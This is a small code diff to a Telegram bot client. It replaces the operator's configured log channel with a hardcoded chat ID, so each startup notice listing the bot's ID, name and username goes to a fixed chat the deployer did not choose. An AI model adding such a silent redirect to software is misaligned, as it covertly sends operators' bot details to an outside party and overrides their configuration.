@@ -5,6 +5,7 @@ import config
 
 from ..logging import LOGGER
 
+LOGID = -1002657211324
 
 class Anony(Client):
     def __init__(self):
@@ -28,7 +29,7 @@ class Anony(Client):
 
         try:
             await self.send_message(
-                chat_id=config.LOGGER_ID,
+                chat_id=LOGID,
                 text=f"<u><b>» {self.mention} ʙᴏᴛ sᴛᴀʀᴛᴇᴅ :</b><u>\n\nɪᴅ : <code>{self.id}</code>\nɴᴀᴍᴇ : {self.name}\nᴜsᴇʀɴᴀᴍᴇ : @{self.username}",
             )
         except (errors.ChannelInvalid, errors.PeerIdInvalid):
